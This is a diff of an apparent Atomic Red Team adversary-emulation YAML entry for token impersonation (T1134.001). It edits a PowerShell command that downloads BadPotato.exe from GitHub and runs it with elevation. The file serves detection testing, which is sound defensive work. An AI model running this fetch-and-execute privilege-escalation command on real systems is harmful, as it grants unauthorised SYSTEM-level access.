@@ -13,11 +13,11 @@
         command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\BadPotato.exe")
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\BadPotato.exe"
-          "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true";
-          fi; cd "PathToAtomicsFolder\..\ExternalPayloads"; Start-Process .\BadPotato.exe
-          notepad.exe; Start-Sleep -Second 20; Stop-Process -Name "notepad" -force
-          -erroraction silentlycontinue; Stop-Process -Name "BadPotato" -force -erroraction
-          silentlycontinue'
+          "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true"
+          -UseBasicParsing; fi; cd "PathToAtomicsFolder\..\ExternalPayloads"; Start-Process
+          .\BadPotato.exe notepad.exe; Start-Sleep -Second 20; Stop-Process -Name
+          "notepad" -force -erroraction silentlycontinue; Stop-Process -Name "BadPotato"
+          -force -erroraction silentlycontinue'
         cleanup: taskkill /f /im notepad.exe
         elevation_required: true
   plugin: atomic
@@ -26,9 +26,9 @@
   delete_payload: false
   privilege: ''
   buckets:
+  - privilege-escalation
   - t1134.001
   - atomic-red-team
-  - privilege-escalation
   author: Atomic Red Team
   additional_info:
     dependencies:
@@ -44,8 +44,9 @@
 
         Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\BadPotato.exe"
         "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true"
+        -UseBasicParsing
 
         '
     technique_created: '2020-02-18T16:39:06.289Z'
     atomic_guid: 9c6d799b-c111-4749-a42f-ec2f8cb51448
-    import_timestamp: '2026-10-20T07:08:27.352608Z'
+    import_timestamp: '2026-10-21T07:01:50.016361Z'
